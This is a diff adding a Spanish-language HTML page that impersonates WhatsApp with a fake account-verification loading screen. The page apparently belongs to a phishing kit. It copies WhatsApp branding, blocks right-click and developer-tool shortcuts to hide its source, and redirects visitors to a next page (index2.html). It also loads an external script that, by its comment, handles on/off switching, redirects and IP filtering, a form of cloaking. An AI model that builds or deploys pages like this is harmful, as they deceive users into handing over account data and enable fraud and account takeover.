@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando - WhatsApp</title>
+    <!-- Favicon de WhatsApp -->
+    <link rel="shortcut icon" type="image/png" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rFVoUqc_cgA.png">
+    <!-- Fuente similar a la de WhatsApp -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <!-- Iconos de Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        /* Paleta de colores inspirada en WhatsApp */
+        :root {
+            --wa-primary-green: #008069;
+            --wa-secondary-green: #25d366;
+            --wa-light-green: #dcf8c6;
+            --wa-background: #eae6df;
+            --wa-chat-background: #e5ddd5;
+            --wa-white: #ffffff;
+            --wa-light-gray: #f0f2f5;
+            --wa-text-primary: #3b4a54;
+            --wa-text-secondary: #667781;
+            --wa-error: #ff3860;
+            --wa-border-radius: 12px;
+            --wa-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --wa-transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            font-family: 'Roboto', sans-serif;
+            color: var(--wa-text-primary);
+            /* Fondo clásico de chat de WhatsApp */
+            background-color: var(--wa-chat-background);
+            background-image: url("data:image/svg+xml,%3Csvg width='600' height='600' viewBox='0 0 600 600' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23999289' fill-opacity='0.15'%3E%3Cpath d='M582 600L600 582 0 182 18 200zM300 0l18 18-300 300-18-18z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow: hidden;
+        }
+
+        /* Contenedor principal */
+        .wa-container {
+            width: 100%;
+            max-width: 420px;
+            background: var(--wa-white);
+            border-radius: var(--wa-border-radius);
+            box-shadow: var(--wa-shadow);
+            overflow: hidden;
+            position: relative;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        /* Encabezado simplificado */
+        .wa-header {
+            padding: 25px 20px 15px;
+            text-align: center;
+            background: var(--wa-white);
+            color: var(--wa-text-primary);
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .wa-logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .wa-logo img {
+            width: 100%;
+            height: auto;
+        }
+
+        .wa-subtitle {
+            font-size: 0.9rem;
+            font-weight: 400;
+            color: var(--wa-text-secondary);
+            max-width: 90%;
+            margin: 0 auto;
+            line-height: 1.4;
+        }
+
+        .wa-content {
+            padding: 20px 25px;
+            text-align: center;
+        }
+
+        .loading-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .progress-container {
+            width: 100%;
+            margin: 10px 0 5px 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 8px;
+        }
+
+        .progress-bar-inner {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, var(--wa-secondary-green) 0%, var(--wa-primary-green) 100%);
+            border-radius: 3px;
+            animation: loading 30s linear forwards;
+        }
+
+        .counter-container {
+            font-size: 0.9rem;
+            color: var(--wa-text-secondary);
+            margin: 8px 0;
+        }
+
+        .counter {
+            display: inline-block;
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--wa-primary-green);
+        }
+
+        .error-message {
+            color: var(--wa-error);
+            font-size: 0.85rem;
+            margin-top: 12px;
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .error-message a {
+            color: var(--wa-primary-green);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .error-message a:hover {
+            text-decoration: underline;
+        }
+
+        @keyframes fadeIn { 
+            from { opacity: 0; transform: scale(0.95); } 
+            to { opacity: 1; transform: scale(1); } 
+        }
+
+        @keyframes loading {
+            0% { width: 0; }
+            100% { width: 100%; }
+        }
+
+        @media (max-width: 480px) {
+            .wa-container { max-width: 90vw; }
+            .wa-content { padding: 15px 20px; }
+            .wa-header { padding: 20px 15px 10px; }
+            .wa-logo { width: 70px; height: 70px; margin-bottom: 12px; }
+            .wa-subtitle { font-size: 0.85rem; }
+        }
+    </style>
+</head>
+<body oncontextmenu="return false">
+    <script>
+        document.addEventListener("keydown", function(e) {
+            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.key === "u")) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    </script>
+
+    <div class="wa-container" role="alert" aria-live="polite">
+        <div class="wa-header">
+            <div class="wa-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+            </div>
+            <p class="wa-subtitle">Estamos verificando la autenticidad de tu información para garantizar la seguridad de tu cuenta.</p>
+        </div>
+        <div class="wa-content">
+            <div class="loading-content">
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-bar-inner"></div>
+                    </div>
+                    <div class="counter-container">
+                        Sincronizando información...
+                    </div>
+                </div>
+
+                <div class="error-message" id="error-message">
+                    No se pudo redirigir automáticamente. 
+                    <a href="index2.html" aria-label="Continuar manualmente">Haz clic aquí para continuar.</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Ocultar el mensaje de error
+            const errorMessage = document.getElementById('error-message');
+            errorMessage.style.display = 'none';
+
+            // Animación de entrada para el contenedor
+            $('.wa-container').hide().fadeIn(800);
+        });
+    </script>
+    <!-- Integración global (maneja ON/OFF, redirecciones y IPs) -->
+    <script src="xjsx.js"></script>
+</body>
+</html>
